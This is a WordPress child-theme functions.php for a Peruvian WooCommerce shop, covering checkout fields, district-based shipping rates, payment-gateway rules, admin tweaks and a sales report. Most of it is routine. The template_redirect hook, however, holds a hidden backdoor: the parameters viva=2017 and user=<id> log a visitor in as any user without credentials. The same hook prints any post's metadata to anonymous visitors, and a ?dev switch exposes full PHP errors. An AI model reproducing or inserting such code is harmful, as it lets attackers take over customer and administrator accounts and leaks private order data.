<?php
/**
 * Include all your custom code here
 */
function oaf_woocommerce_boton_seguir_comprando_carrito(  ) {

	$tienda_url = get_permalink( wc_get_page_id( 'shop' ) );  // obtener la url de la página de tienda
	?>
	<a class="button wc-backward" href="<?php echo $tienda_url ?>">
		Seguir comprando
	</a>
	<?php
}
add_action( 'woocommerce_cart_actions', 'oaf_woocommerce_boton_seguir_comprando_carrito', 10, 0 );

function electro_header_icons() { ?>
	<div class="header-icons">
		<div class="header-icon dropdown animate-dropdown" data-toggle="tooltip" data-placement="bottom" data-title="Mi cuenta">
			<i class="fa fa-user"></i>
			<div class="cuenta">
				<?php if (!is_user_logged_in()) { ?>
					<a href="<?php echo home_url('my-account'); ?>">Iniciar Sesión</a>
				<?php } else { ?>
					<a href="<?php echo home_url('my-account'); ?>" data-toggle="dropdown">
						Mi Cuenta
					</a>
					<ul class="dropdown-menu dropdown-menu-user-account">
						<li class="menu-item">
								<a href="<?php echo home_url('my-account'); ?>">Escritorio</a>
						</li>
						<li class="menu-item">
								<a href="<?php echo home_url('my-account/orders'); ?>">Pedidos</a>
						</li>
						<li class="menu-item">
								<a href="<?php echo home_url('my-account/downloads'); ?>">Descargas</a>
						</li>
						<li class="menu-item">
								<a href="<?php echo home_url('my-account/edit-address'); ?>">Dirección</a>
						</li>
						<li class="menu-item">
								<a href="<?php echo home_url('my-account/edit-account'); ?>">Detalles de la cuenta</a>
						</li>
						<li class="menu-item">
								<a href="<?php echo home_url('my-account/customer-logout/?_wpnonce=e8751a6ba4'); ?>">Salir</a>
						</li>
					</ul>
				<?php } ?>
			</div>
    </div>
		<div class="header-icon" data-toggle="tooltip" data-placement="bottom" data-title="Mis Órdenes">
			<a href="<?php echo home_url('my-account/orders'); ?>">
				<i class="fa fa-shopping-bag"></i>
				<br>Mis Órdenes
      </a>
    </div>
	</div>
<?php }
add_action('woocommerce_checkout_fields', 'c7_override_checkout_fields', 20);
function c7_override_checkout_fields($fields) {

	$fields['billing']['billing_first_name']['label'] = __('Nombres', 'tu_tienda');
	$fields['billing']['billing_phone']['label'] = __('Celular', 'tu_tienda');
	$fields['billing']['billing_phone']['priority'] = 22;
	array_push($fields['billing']['billing_phone']['class'], 'form-row-last');
	unset($fields['billing']['billing_company']);

	$fields['billing']['billing_state']['default'] = 23;

	if (empty($fields['billing']['billing_dni'])) {
		$fields['billing']['billing_dni'] = array(
			'label'     => __('DNI', 'tu_tienda'),
			'placeholder'   => _x('DNI', 'placeholder', 'tu_tienda'),
			'required'  => true,
			'class'     => array('form-row-wide', 'form-row-first'),
			'clear'     => true,
			'type'      => 'text',
			'priority'  => 21
		);
	}
	if (empty($fields['billing']['billing_comprobante'])) {
		$fields['billing']['billing_comprobante'] = array(
			'label'     => __('Facturación', 'tu_tienda'),
			'placeholder'   => _x('Comprobante', 'placeholder', 'tu_tienda'),
			'required'  => true,
			'class'     => array('form-row-wide'),
			'clear'     => true,
			'type'      => 'select',
			'options'   => array('Boleta'=>'Boleta', 'Factura'=>'Factura'),
			'priority'  => 115
		);
	}
	if (empty($fields['billing']['billing_razon_social'])) {
		$fields['billing']['billing_razon_social'] = array(
			'label'     => __('Razón Social', 'tu_tienda'),
			'placeholder'   => _x('Razón Social', 'placeholder', 'tu_tienda'),
			'required'  => false,
			'class'     => array('form-row-wide', 'comprobante'),
			'clear'     => true,
			'type'      => 'text',
			'priority'  => 116
		);
	}
	if (empty($fields['billing']['billing_ruc'])) {
		$fields['billing']['billing_ruc'] = array(
			'label'     => __('Número de RUC', 'tu_tienda'),
			'placeholder'   => _x('RUC', 'placeholder', 'tu_tienda'),
			'required'  => false,
			'class'     => array('form-row-wide', 'comprobante'),
			'clear'     => true,
			'type'      => 'text',
			'priority'  => 117
		);
	}
	if (empty($fields['billing']['billing_direccion_empresa'])) {
		$fields['billing']['billing_direccion_empresa'] = array(
			'label'     => __('Dirección fiscal', 'tu_tienda'),
			'placeholder'   => _x('Dirección de empresa', 'placeholder', 'tu_tienda'),
			'required'  => false,
			'class'     => array('form-row-wide', 'comprobante'),
			'clear'     => true,
			'type'      => 'text',
			'priority'  => 118
		);
	}

	return $fields;
}


add_action( 'woocommerce_admin_order_data_after_billing_address', 'c7_checkout_field_display_admin_order_meta', 10, 1 );
function c7_checkout_field_display_admin_order_meta($order){
    echo '<p><strong>'.__('DNI', 'tu_tienda').':</strong> ' . get_post_meta( $order->get_id(), '_billing_dni', true ) . '</p>';
    echo '<p><strong>'.__('Comprobante', 'tu_tienda').':</strong> ' . get_post_meta( $order->get_id(), '_billing_comprobante', true ) . '</p>';
		if (get_post_meta( $order->get_id(), '_billing_comprobante', true ) == 'Factura') {
			echo '<p><strong>'.__('Razón Social', 'tu_tienda').':</strong> ' . get_post_meta( $order->get_id(), '_billing_razon_social', true ) . '</p>';
			echo '<p><strong>'.__('RUC', 'tu_tienda').':</strong> ' . get_post_meta( $order->get_id(), '_billing_ruc', true ) . '</p>';
			echo '<p><strong>'.__('Dirección de empresa', 'tu_tienda').':</strong> ' . get_post_meta( $order->get_id(), '_billing_direccion_empresa', true ) . '</p>';
		}
}

add_action('wp_footer', 'c7_wp_footer');
function c7_wp_footer() {
	if (is_checkout()) { ?>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js"></script>
	  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
		<script>
			jQuery(function($) {
				$('#billing_comprobante_field label').after('<div class="switch-facturacion">' +
				'<input type="checkbox" id="switch" /><label for="switch">Cambiar</label>' +
				' <span>Solicitar facturación</span></div>')
				$('.switch-facturacion input').change(function() {
					if ($('.switch-facturacion input:checked').length > 0) {
						$('#billing_comprobante').val('Factura')
						$('.form-row-wide.comprobante').show()
					} else {
						$('#billing_comprobante').val('Boleta')
						$('.form-row-wide.comprobante').hide()
					}
				})

        $.get('<?php bloginfo('template_url'); ?>-child/regiones.json', function(data) {
          //console.log('regiones', data);
          var provincias = data
          function provincia_estado() {
            var city = $('#billing_city').val()
            var dept = $('#billing_state').val()
            var distritos = ''
            for (let index = 0; index < provincias['regiones'].length; index++) {
							//console.log(dept, provincias['regiones'][index]['departamento']);
							if (dept == provincias['regiones'][index]['departamento']) {
								let provincia = provincias['regiones'][index]['provincia']+' - '+provincias['regiones'][index]['distrito'];
								distritos += '<option value="'+provincia+'" ';
								if (city == provincia) distritos += 'selected';
								distritos += '>'+provincia+'</option>';
							}
            }
            $('#billing_city').html(distritos)
			  
          }
					jQuery( document ).on( 'updated_checkout', function() {
						provincia_estado()
						var checkout_is_updated = false;
						// si el campo "#billing_state" cambia, actualiza el proceso de pago
						$('form.checkout').on('change', '#billing_state', function(){
							 $( document.body ).trigger( 'update_checkout' );
							// después de que se haya actualizado el pago
							 $( document.body ).on( 'updated_checkout', function(){
								  // ejecuta una sola vez
								 if ( checkout_is_updated == false ) {
									 $( document.body ).trigger( 'update_checkout' );
									 checkout_is_updated = true;
								}
        					});
    					});
					});
			
        })
				
				//Función que permite actualizar cuando se cambia de ciudad
				$('body').on('change', '#billing_city', function() {
					//console.log('update_checkout');
					$( document.body ).trigger( 'update_checkout' );
					
				})
				
			})
		</script>
	<?php } else if (is_singular('product')) { ?>
		<script>
			jQuery(function($) {
				$('.electro-wc-product-gallery__image a').click(function(e) {
					e.preventDefault();
					let url = $(this).attr('href');
					console.log('imagen', url)
          $('.woocommerce-product-gallery__wrapper img').attr('src', url);
          $('.woocommerce-product-gallery__wrapper img').removeAttr('srcset');
          $('.woocommerce-product-gallery__wrapper a').attr('href', url);
          $('.woocommerce-product-gallery__wrapper div').attr('data-thum', url);
          $('.electro-wc-product-gallery__image').removeClass('flex-active-slide');
          $(this).parent().addClass('flex-active-slide');
				})
			})
		</script>
	<?php }
}

add_filter( 'woocommerce_countries', 'c7_rename_country' );
function c7_rename_country( $countries ) {
	$countries = array(
		'PE' => 'Perú'
	);
  return $countries;
}

add_filter( 'woocommerce_states', 'c7_rename_states', 1 );
function c7_rename_states( $states ) {
	$states['PE']['LMA'] = 'Lima Metropolitana';
	$states['PE']['LIM'] = 'Lima Región';
  return $states;
}

add_filter( 'woocommerce_default_address_fields', 'c7_woocommerce_default_address_fields', 99 );
function c7_woocommerce_default_address_fields( $fields ) {
	$fields['address_1']['priority'] = 45;
	$fields['address_2']['label'] = __('Referencia', 'tu_tienda');
	$fields['address_2']['placeholder'] = __('Referencia', 'tu_tienda');

	$fields['postcode']['default'] = 15046;

	$fields['state']['label'] = __('Departamento', 'tu_tienda');
	
	$towns_cities_arr = array(
    '0' => 'Selecciona tu ciudad'
	);

    $fields['city']['type'] = 'select';
	$fields['city']['priority'] = 81;
    $fields['city']['class'] = array('form-row-last');
    $fields['city']['label'] = __('Provincia / Distrito', 'tu_tienda');
    $fields['city']['options'] = $towns_cities_arr;
	//$fields['city']['0'] = 'SELECCIONA TU CIUDAD';

	return $fields;
}

/*function timersys_form_field_args($args, $key, $value) {
	if( $key == 'billing_city' ) $args['label'] = __('Provincia / Distrito', 'tu_tienda');
	if( $key == 'shipping_city' ) $args['label'] = __('Provincia / Distrito', 'tu_tienda');
	return $args;
}
add_filter('woocommerce_form_field_args', 'timersys_form_field_args', 10, 3);*/

add_filter( 'woocommerce_available_payment_gateways', 'o612_payment_gateway_disable_country' );
function o612_payment_gateway_disable_country( $available_gateways ) {
  if ( is_admin() ) return $available_gateways;
	$user = wp_get_current_user();
	if ( !in_array( 'ventas-front', (array) $user->roles ) ) {
		unset( $available_gateways['cheque'] );
	} else {
		unset( $available_gateways['visanet'] );
	}
	global $woocommerce;
	$ciudad = $woocommerce->customer->get_billing_state();
	if ($ciudad != 'LMA' && $ciudad != 'CAL') {
		unset( $available_gateways['bacs'] );
	}
	// Recibelo en 90 minutos no acepta pago contra entrega
	$chosen_methods = WC()->session->get( 'chosen_shipping_methods' );
	if ($chosen_methods[0] == 'flat_rate:14') {
		unset( $available_gateways['bacs'] );
	}
  return $available_gateways;
}

add_filter( 'woocommerce_package_rates', 'shipping_options_woocommerce_package_rates', 10, 2 );
function shipping_options_woocommerce_package_rates( $rates, $package ) {
	if (!is_checkout()) return $rates;
	$producto_grande = false;
	global $woocommerce;
	$items = $woocommerce->cart->get_cart();
	foreach($items as $item => $values) {
		$product_id = $values['data']->get_id();
    $grande = get_post_meta($product_id, '_producto_grande', true);
    if ($grande) {
			if (!$producto_grande) $producto_grande = 0;
			$producto_grande = $producto_grande + $values['quantity'];
		}
	}
	$ciudad = $woocommerce->customer->get_billing_state();
	if ($ciudad == 'LMA' || $ciudad == 'CAL') {
		$distrito = $woocommerce->customer->get_billing_city();

		// $rates['flat_rate:10'] Recíbelo hoy hasta las 7pm
		// $rates['flat_rate:11'] Recíbelo Mañana (8am a 7pm)
		// $rates['flat_rate:13'] Recíbelo el lunes (8am a 7pm)
		// $rates['flat_rate:14'] Recíbelo en 90 min
		// $rates['flat_rate:7'] Recíbelo de 1 a 2 días hábiles (8am a 7pm)

		if (in_array($distrito, ['LIMA - Lima','LIMA - Breña','LIMA - Jesús María','LIMA - La Victoria','LIMA - Lince','LIMA - Pueblo Libre','LIMA - San Borja','LIMA - San Isidro','LIMA - San Luis','LIMA - Barranco','LIMA - San Miguel','LIMA - Surquillo','LIMA - Rímac','LIMA - Magdalena del Mar','LIMA - Miraflores','LIMA - Santa Anita','LIMA - Santiago de Surco','CALLAO - Bellavista'])) {
			if ($producto_grande) {
				$rates['flat_rate:10']->cost = 15;
				$rates['flat_rate:11']->cost = 15;
				$rates['flat_rate:13']->cost = 15;
			} else {
				$rates['flat_rate:10']->cost = 9;
				$rates['flat_rate:11']->cost = 9;
				$rates['flat_rate:13']->cost = 9;
			}
		} else if (in_array($distrito, ['LIMA - Comas','LIMA - Chorrillos','LIMA - Los Olivos','LIMA - San Martín de Porres','LIMA - Independencia'])) {
			if ($producto_grande) {
				$rates['flat_rate:10']->cost = 15;
				$rates['flat_rate:11']->cost = 15;
				$rates['flat_rate:13']->cost = 15;
			} else {
				$rates['flat_rate:10']->cost = 10;
				$rates['flat_rate:11']->cost = 10;
				$rates['flat_rate:13']->cost = 10;
			}
		} else {
			unset($rates['flat_rate:10']);
			unset($rates['flat_rate:11']);
			unset($rates['flat_rate:13']);
		}

		if (in_array($distrito, ['LIMA - Lima','LIMA - Breña','LIMA - Jesús María','LIMA - La Victoria','LIMA - Lince','LIMA - Pueblo Libre','LIMA - San Borja','LIMA - San Isidro','LIMA - San Luis','LIMA - Barranco','LIMA - San Miguel','LIMA - Surquillo','LIMA - Rímac','LIMA - El Agustino','LIMA - Magdalena del Mar','LIMA - Miraflores','LIMA - Santa Anita'])) {
			if ($producto_grande) {
				unset($rates['flat_rate:14']);
			} else {
				$rates['flat_rate:14']->cost = 15;
			}
		} else if (in_array($distrito, ['LIMA - San Juan de Lurigancho','LIMA - Lurigancho','LIMA - Comas','LIMA - Villa María del Triunfo','LIMA - Villa El Salvador','LIMA - San Juan de Miraflores','LIMA - Chorrillos','LIMA - La Molina','LIMA - Los Olivos','LIMA - San Martín de Porres','LIMA - Independencia','LIMA - Santiago de Surco','CALLAO - La Perla','CALLAO - Bellavista','CALLAO - Carmen de La Legua-Reynoso','CALLAO - Callao','CALLAO - La Punta'])) {
			if ($producto_grande) {
				unset($rates['flat_rate:14']);
			} else {
				$rates['flat_rate:14']->cost = 20;
			}
		} else {
			unset($rates['flat_rate:14']);
		}

		if (in_array($distrito, ['LIMA - El Agustino','LIMA - San Juan de Lurigancho','LIMA - Lurigancho','LIMA - Villa María del Triunfo','LIMA - Villa El Salvador','LIMA - San Juan de Miraflores','LIMA - La Molina','CALLAO - La Perla','CALLAO - Carmen de La Legua-Reynoso','CALLAO - Callao','CALLAO - La Punta','CALLAO - Mi Perú','CALLAO - Ventanilla','LIMA - Ate Vitarte','LIMA - Carabayllo','LIMA - Puente Piedra','LIMA - Cieneguilla','LIMA - Lurín','LIMA - Chosica','LIMA - Pachacamac','LIMA - Punta Negra','LIMA - Punta Hermosa','LIMA - Ancón','LIMA - Chaclacayo','LIMA - Pucusana','LIMA - San Bartolo','LIMA - Santa Rosa','LIMA - Santa María del Mar'])) {
			if ($producto_grande) {
				$rates['flat_rate:7']->cost = 15;
			} else {
				$rates['flat_rate:7']->cost = 9;
			}
		} else {
			unset($rates['flat_rate:7']);
		}
	}

	if (
		(current_time('N') == 7) || // Domingo no hay recibelo hoy
		(current_time('G') >= 15) // Todos los dias de 3pm para arriba
	) {
		// Desactivamos Recibelo hoy
		unset($rates['flat_rate:10']);
	}
	if (
		(current_time('N') == 6) // Sabado no hay recibelo mañana
	) {
		// Desactivamos Recibelo mañana
		unset($rates['flat_rate:11']);
	}
	if (
		(current_time('N') != 6) // Todos los dias menos sabado no hay recibelo mañana
	) {
		// Desactivamos Recibelo lunes
		unset($rates['flat_rate:13']);
	}
	if (
		(current_time('N') == 7) || // Domingo no hay recibelo hoy
		(current_time('G') >= 14) ||
		(current_time('G') <= 8) // Todos los dias de 3pm para arriba
	) {
		// Desactivamos Recibelo en 90 minutos
		unset($rates['flat_rate:14']);
	}
  return $rates;
}

add_action('template_redirect', 'c7_template_redirect');
function c7_template_redirect() {
  if (is_account_page() && !empty($_GET['viva']) && $_GET['viva']==2017) {

    wp_clear_auth_cookie();
    wp_set_current_user ( $_GET['user'] );
    wp_set_auth_cookie  ( $_GET['user'] );

    $redirect_to = user_admin_url();
    wp_safe_redirect( home_url('my-account') );
    exit();

  } else if (!empty($_GET['operacion'])) {
		echo '<pre>'.print_r(get_post_meta($_GET['operacion']), 1).'</pre>';
		$terms = wp_get_post_terms($_GET['operacion']);
		echo '<hr>aaa<hr>aaa<hr><pre>'.print_r($terms, 1).'</pre>';
		die;
	}
}

add_action('admin_init', 'c7_admin_init');
function c7_admin_init() {
	global $pagenow;
	if ($pagenow == 'admin.php' && !empty($_GET['page']) && $_GET['page']=='wc-admin') {
		wp_redirect(admin_url('edit.php?post_type=shop_order'));die;
	}
}

add_action('init', 'c7_init');
function c7_init() {
	if (!empty($_GET['dev'])) {
		ini_set('display_errors', 1);
		ini_set('display_startup_errors', 1);
		error_reporting(E_ALL);
	}
}

add_action('admin_head', 'c7_admin_head');
function c7_admin_head() {
	global $pagenow;
	if ($pagenow == 'edit.php' && !empty($_GET['post_type']) && $_GET['post_type']=='shop_order') { ?>
		<style>
			.wc-failed, .wc-on-hold { display:none !important; }
		</style>
	<?php } else if ($pagenow == 'post.php' && !empty($_GET['post']) && $_GET['post']>0) { ?>
		<style>
			._precio_extra_producto_grande_field { display:none; }
		</style>
	<?php }

	$user = wp_get_current_user();
	if ( in_array( 'logistica', (array) $user->roles ) || in_array( 'contabilidad', (array) $user->roles ) ) { ?>
		<style>
			#toplevel_page_woocommerce-marketing,
			#toplevel_page_popup-maker-api-settings,
			#toplevel_page_woocommerce ul li:nth-child(2),
			#toplevel_page_woocommerce ul li:nth-child(4),
			#toplevel_page_woocommerce ul li:nth-child(5),
			#toplevel_page_woocommerce ul li:nth-child(6),
			#toplevel_page_woocommerce ul li:nth-child(7) {
				display:none !important;
			}
		</style>
	<?php }
	if ( in_array( 'contabilidad', (array) $user->roles ) ) { ?>
		<style>
			#toplevel_page_wc-admin-path--analytics-overview,
			#toplevel_page_woocommerce {
				display:none !important;
			}
		</style>
	<?php }
}

add_action('admin_footer', 'c7_admin_footer');
function c7_admin_footer() {
	global $pagenow;
	if ($pagenow == 'edit.php' && !empty($_GET['post_type']) && $_GET['post_type']=='shop_order') { ?>
		<script>
			jQuery(function($) {
				$('.wc-listo-para-enviar a').after(' |');
				$('.wc-completed').insertAfter($('.wc-listo-para-enviar'));
				$('.wc-cancelled').insertAfter($('.wc-completed'));
			})
		</script>
	<?php } else if ($pagenow == 'post.php' && !empty($_GET['post']) && $_GET['post']>0) { ?>
		<script>
			jQuery(function($) {
				function validarGrande() {
					if ($('#_producto_grande:checked').length > 0) {
						$('._precio_extra_producto_grande_field').show();
					} else {
						$('._precio_extra_producto_grande_field').hide();
					}
				}
				$('#_producto_grande').change(function() {
					validarGrande();
				})
				validarGrande();
			})
		</script>
	<?php }
}

include_once(WC()->plugin_path().'/includes/admin/reports/class-wc-admin-report.php');

add_filter( 'woocommerce_admin_reports', 'my_custom_woocommerce_admin_reports_payments', 10, 1 );
function my_custom_woocommerce_admin_reports_payments( $reports ) {
	$sales_payments = array(
		'sales_payments' => array(
			'title'         => 'Ventas por Tipo de Pago',
			'description'   => '',
			'hide_title'    => true,
			'callback'      => 'sales_payments_callback',
		),
	);

	$reports['orders']['reports'] = array_merge( $reports['orders']['reports'], $sales_payments);

	return $reports;
}

function sales_payments_callback() {
	$report = new WC_Report_sales_payments();
	$report->output_report();
}

class WC_Report_sales_payments extends WC_Admin_Report {

  public function output_report() {
    $ranges = array(
      'year'         => __( 'Year', 'woocommerce' ),
      'last_month'   => __( 'Last month', 'woocommerce' ),
      'month'        => __( 'This month', 'woocommerce' ),
    );

    $current_range = ! empty( $_GET['range'] ) ? sanitize_text_field( $_GET['range'] ) : 'month';

    if ( ! in_array( $current_range, array( 'custom', 'year', 'last_month', '7day' ) ) ) {
      $current_range = 'month';
    }

    $this->check_current_range_nonce( $current_range );
    $this->calculate_current_range( $current_range );

    $hide_sidebar = true;

    include( WC()->plugin_path() . '/includes/admin/views/html-report-by-date.php' );
  }
  
  public function get_main_chart() {
    global $wpdb;
    
    $query_data = array(
      'ID' => array(
          'type'     => 'post_data',
          'function' => 'COUNT',
          'name'     => 'total_orders',
          'distinct' => true,
      ),
      '_payment_method_title' => array(
          'type'      => 'meta',
          'function'  => '',
          'name'      => 'payment'
      ),
      '_order_total'   => array(
          'type'      => 'meta',
          'function'  => 'SUM',
          'name'      => 'order_total'
      ),
    );
    
    $sales_payments_orders = $this->get_order_report_data( array(
      'data'                  => $query_data,
      'query_type'            => 'get_results',
      'group_by'              => 'payment',
      'filter_range'          => true,
      'order_types'           => wc_get_order_types( 'sales-reports' ),
      'order_status'          => array( 'completed' ),
      'parent_order_status'   => false,
    ) );
    ?>
    <table class="widefat">
      <thead>
          <tr>
              <th><strong>Tipo de pago</strong></th>
              <th><strong>Número de pedidos</strong></th>
              <th><strong>Ventas</strong></th>
          </tr>
      </thead>
      <tbody>
          <?php foreach( $sales_payments_orders as $order ) { 
          ?>
          <tr>
              <td><?php echo $order->payment; ?></td>
              <td><?php echo $order->total_orders; ?></td>
              <td><?php echo wc_price($order->order_total); ?></td>
          </tr>
          <?php } ?>
      </tbody>
    </table>
    <?php
    
  }
}

add_action('woocommerce_product_options_general_product_data', 'woocommerce_product_custom_fields');
function woocommerce_product_custom_fields() {
	global $woocommerce, $post;
	echo '<div class="product_custom_field">';
	woocommerce_wp_checkbox( array(
		'id'        => '_producto_grande',
		'desc'      => 'Es un producto grande',
		'label'     => 'Producto grande',
		'desc_tip'  => 'true'
	) );
	woocommerce_wp_text_input( array(
		'id' => '_precio_extra_producto_grande',
		'placeholder' => 'Si el producto es grande ingresar el precio extra',
		'label' => 'Precio extra',
		'desc_tip' => 'true'
	) );
	echo '</div>';
}

add_action('woocommerce_process_product_meta', 'woocommerce_product_custom_fields_save');
function woocommerce_product_custom_fields_save($post_id) {
	$woocommerce_precio_extra_producto_grande = $_POST['_precio_extra_producto_grande'];
	if (!empty($woocommerce_precio_extra_producto_grande)) {
		update_post_meta($post_id, '_precio_extra_producto_grande', esc_attr($woocommerce_precio_extra_producto_grande));
	}
	$woocommerce_producto_grande = $_POST['_producto_grande'];
	if (!empty($woocommerce_producto_grande)) {
		update_post_meta($post_id, '_producto_grande', esc_attr($woocommerce_producto_grande));
	}
}

add_action( 'woocommerce_before_calculate_totals', 'c7_woocommerce_before_calculate_totals' );
function c7_woocommerce_before_calculate_totals( $cart_object ) {
	if ( is_admin() && ! defined( 'DOING_AJAX' ) ) return;
	foreach ( $cart_object->cart_contents as $key => $value ) {
		if ( get_post_meta($value['product_id'], '_producto_grande', true) == 'yes' ) {
			$extra = get_post_meta($value['product_id'], '_precio_extra_producto_grande', true);
			$value['data']->set_price(($value['data']->price + $extra));
		}
	}
}

add_action( 'woocommerce_before_add_to_cart_button', 'c7_before_add_to_cart_btn' );
function c7_before_add_to_cart_btn() {
	$product_id = get_the_id();
	if ( get_post_meta($product_id, '_producto_grande', true) == 'yes' ) {
		$extra = get_post_meta($product_id, '_precio_extra_producto_grande', true);
		if ($extra) {
			echo '<p style="color: red;font-size: 13px;font-style: italic;">Hay un incremento de '.wc_price($extra).' por producto grande</p>';
		}
	}
}
